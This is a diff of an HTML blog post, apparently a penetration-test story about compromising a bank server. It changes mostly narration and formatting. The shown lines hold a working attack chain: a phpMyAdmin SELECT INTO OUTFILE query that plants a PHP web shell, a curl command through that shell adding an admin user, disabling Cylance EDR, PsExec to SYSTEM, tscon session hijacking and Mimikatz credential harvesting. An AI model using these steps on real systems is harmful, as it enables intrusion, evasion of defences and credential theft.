@@ -996,7 +996,7 @@ Boom. A treasure trove of exposed files, including a <code>/phpmyadmin/</code> f
 At that moment, the attack pathway drew itself on my mind.
 (Since you can't read minds, I've decided to write it down below.)</p>
 <div class="highlight"><pre><span></span><code><span class="w">    </span>+------------------------+
-<span class="w">    </span><span class="p">|</span><span class="w">    </span>Our<span class="w"> </span>Computer<span class="w">        </span><span class="p">|</span><span class="w">  </span>
+<span class="w">    </span><span class="p">|</span><span class="w">    </span>My<span class="w"> </span>Computer<span class="w">         </span><span class="p">|</span><span class="w">  </span>
 <span class="w">    </span><span class="p">|</span><span class="w">    </span><span class="o">(</span>Attacker<span class="o">)</span><span class="w">          </span><span class="p">|</span><span class="w">  </span>
 <span class="w">    </span>+------------------------+
 <span class="w">              </span><span class="p">|</span>
@@ -1022,7 +1022,7 @@ At that moment, the attack pathway drew itself on my mind.
 <span class="w">    </span><span class="p">|</span><span class="w">  </span>+-------------------+<span class="w"> </span><span class="p">|</span>
 <span class="w">    </span>+------------------------+
 <span class="w">              </span><span class="p">|</span>
-<span class="w">              </span><span class="p">|</span><span class="w"> </span>Attacker<span class="w"> </span>accesses<span class="w"> </span>the<span class="w"> </span>phpMyAdmin<span class="w"> </span>login<span class="w"> </span>page:<span class="w"> </span>
+<span class="w">              </span><span class="p">|</span><span class="w"> </span>Then,<span class="w"> </span>I<span class="w"> </span>will<span class="w"> </span>accesse<span class="w"> </span>the<span class="w"> </span>phpMyAdmin<span class="w"> </span>login<span class="w"> </span>page:<span class="w"> </span>
 <span class="w">              </span><span class="p">|</span><span class="w"> </span><span class="sb">`</span>http://bankserver/phpmyadmin/<span class="sb">`</span>
 <span class="w">              </span>v
 <span class="w">    </span>+------------------------+
@@ -1031,7 +1031,7 @@ At that moment, the attack pathway drew itself on my mind.
 <span class="w">    </span><span class="p">|</span><span class="w">    </span><span class="o">(</span>Hacker<span class="w"> </span>logs<span class="w"> </span><span class="k">in</span><span class="o">)</span><span class="w">    </span><span class="p">|</span>
 <span class="w">    </span>+------------------------+
 <span class="w">              </span><span class="p">|</span>
-<span class="w">              </span><span class="p">|</span><span class="w"> </span>Hacker<span class="w"> </span>executes<span class="w"> </span>a<span class="w"> </span>malicious<span class="w"> </span>query<span class="w"> </span>using<span class="w"> </span><span class="sb">`</span>SELECT<span class="w"> </span>INTO<span class="w"> </span>OUTFILE<span class="sb">`</span>:
+<span class="w">              </span><span class="p">|</span><span class="w"> </span>I<span class="w"> </span>will<span class="w"> </span>execute<span class="w"> </span>a<span class="w"> </span>malicious<span class="w"> </span>query<span class="w"> </span>using<span class="w"> </span><span class="sb">`</span>SELECT<span class="w"> </span>INTO<span class="w"> </span>OUTFILE<span class="sb">`</span>:
 <span class="w">              </span><span class="p">|</span><span class="w"> </span><span class="sb">`</span>SELECT<span class="w"> </span><span class="s1">&#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39;</span><span class="w"> </span>INTO<span class="w"> </span>OUTFILE<span class="w"> </span><span class="s1">&#39;C:\\xampp\\htdocs\\shell.php&#39;</span><span class="p">;</span><span class="sb">`</span>
 <span class="w">              </span>v
 <span class="w">    </span>+-----------------------------------------------------+
@@ -1050,7 +1050,7 @@ At that moment, the attack pathway drew itself on my mind.
 <span class="w">    </span><span class="p">|</span><span class="w">     </span>-<span class="w"> </span>C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\s</span>hell.php<span class="w"> </span><span class="p">|</span>
 <span class="w">    </span>+---------------------------------+
 <span class="w">              </span><span class="p">|</span>
-<span class="w">              </span><span class="p">|</span><span class="w"> </span>attacker<span class="w"> </span>accesses<span class="w"> </span>the<span class="w"> </span>webshell<span class="w"> </span>via:
+<span class="w">              </span><span class="p">|</span><span class="w"> </span>Now,<span class="w"> </span>I<span class="w"> </span>only<span class="w"> </span>have<span class="w"> </span>to<span class="w"> </span>accesses<span class="w"> </span>the<span class="w"> </span>webshell<span class="w"> </span>via:
 <span class="w">              </span><span class="p">|</span><span class="w"> </span><span class="sb">`</span>http://bankserver/shell.php?cmd<span class="o">=</span>whoami<span class="sb">`</span>
 <span class="w">              </span>v
 <span class="w">    </span>+--------------------------------------------------------+
@@ -1083,7 +1083,7 @@ And also, I wasn’t about to leave this beautiful new playground unprotected. S
 curl<span class="w"> </span><span class="s2">&quot;http://targetbank.com/shell.php?cmd=net localgroup administrators pentester /add&quot;</span>
 </code></pre></div>
 BOOOOM!!! Hello, new local admin user.</p>
-<div class="highlight"><pre><span></span><code>[ Windows Server ]
+<p><div class="highlight"><pre><span></span><code>[ Windows Server ]
 +--------------------------------------+
 | Users:                               |
 |  - Administrator                     |
@@ -1091,6 +1091,7 @@ BOOOOM!!! Hello, new local admin user.</p>
 |  - pentester (New Admin!)            |
 +--------------------------------------+
 </code></pre></div>
+After creating the <strong>Local Admin User</strong> I connected to the server using RDP to make it easier for me to harvest information or credentials(using Mimikatz).</p>
 <h3 id="step-4-fighting-cylance-edr-and-winning">Step 4: Fighting Cylance EDR (and Winning)<a class="headerlink" href="#step-4-fighting-cylance-edr-and-winning" title="Permanent link">&para;</a></h3>
 <p>This is where things got even funnier. Every time I tried to run <strong>Mimikatz</strong>, Cylance EDR slapped me like an overprotective parent. So I tried stopping the service:
 <div class="highlight"><pre><span></span><code>sc<span class="w"> </span>stop<span class="w"> </span>Cylance
@@ -1099,37 +1100,28 @@ BOOOOM!!! Hello, new local admin user.</p>
 <p>But guess what? I could still <strong>change the startup type</strong>:
 <div class="highlight"><pre><span></span><code>sc<span class="w"> </span>config<span class="w"> </span>Cylance<span class="w"> </span><span class="nv">start</span><span class="o">=</span><span class="w"> </span>demand
 </code></pre></div>
-<div class="highlight"><pre><span></span><code>[ EDR Service: Cylance ]
-+----------------------+
-| Status: Running      |
-| Protected: Yes       |
-+----------------------+
-
-[ Hacker ] --&gt; sc config Cylance start= demand
-
-[ Server Rebooted ] --&gt; [ Cylance is now disabled! ]
-</code></pre></div></p>
+Now the job was done, we could only just reboot the server to send <em>Cylance EDR</em> to sleep.</p>
 <h3 id="step-5-rdp-and-session-hijacking">Step 5: RDP and Session Hijacking<a class="headerlink" href="#step-5-rdp-and-session-hijacking" title="Permanent link">&para;</a></h3>
-<p>Once in, I used <strong>PsExec</strong> to elevate myself to SYSTEM:
+<p>First, I used <strong>PsExec</strong> to elevate myself to SYSTEM:
 <div class="highlight"><pre><span></span><code>PsExec.exe<span class="w"> </span>-s<span class="w"> </span>-i<span class="w"> </span>cmd.exe
 </code></pre></div>
-And ran:
+Then, I checked for other active/Idle sessions using the command below:
 <div class="highlight"><pre><span></span><code>query<span class="w"> </span>session
 </code></pre></div>
-Guess what? <strong>Administrator</strong> left their session inactive but open. <strong>Rookie mistake #4.</strong></p>
+Guess what? <strong>Administrator</strong> left their session inactive but alive. <strong>Rookie mistake #4.</strong></p>
 <p><div class="highlight"><pre><span></span><code>[ Sessions ]
 +--------------------------------+
 | ID  | User        | Status     |
 |  0  | SYSTEM      | Active     |
 |  1  | pentester   | Active     |
-|  2  | Administrator | Idle    | &lt;-- (Hijack this!)
+|  2  | Administrator | Idle     | &lt;-- (Hijack this!)
 +--------------------------------+
 </code></pre></div>
 Then I executed the command below,</p>
 <p><div class="highlight"><pre><span></span><code>tscon<span class="w"> </span><span class="m">2</span><span class="w"> </span>/dest:console
 </code></pre></div>
-And......Boom—Administrator session hijacked.</p>
-<p>I was raoming around when I noticed there was a network drive mounted for the user Administrator.
+And......Boooooom — Administrator session hijacked.</p>
+<p>I was roaming around when I noticed there was a network drive mounted for the user Administrator.
 The mounted directory contained the following:</p>
 <p><div class="highlight"><pre><span></span><code>[ Compromised Bank Server ] --&gt; [ Mounted Shared Drive ]
                       /------------------------------------\
@@ -1161,10 +1153,10 @@ So, I:
 <p>Then I logged into <strong>CyberArk</strong> and... oh boy. <strong>It gave me access to the core banking system.</strong></p>
 <h2 id="the-aftermath">The Aftermath<a class="headerlink" href="#the-aftermath" title="Permanent link">&para;</a></h2>
 <div class="highlight"><pre><span></span><code>+---------------------------------------+
-| [ Hacker ] --&gt; &quot;Mission Complete 😏&quot;  |
+| [ Me ] --&gt; &quot;Mission Complete 😏&quot;      |
 | - Domain Admin Access                 |
-| - Bypassed EDR                         |
-| - Full Control of Bank Network         |
+| - Bypassed EDR                        |
+| - Full Control of Bank Network        |
 +---------------------------------------+
 </code></pre></div>
 <p>At this point, I basically had the <strong>keys to the kingdom.</strong> This entire chain of failures was due to a mix of:
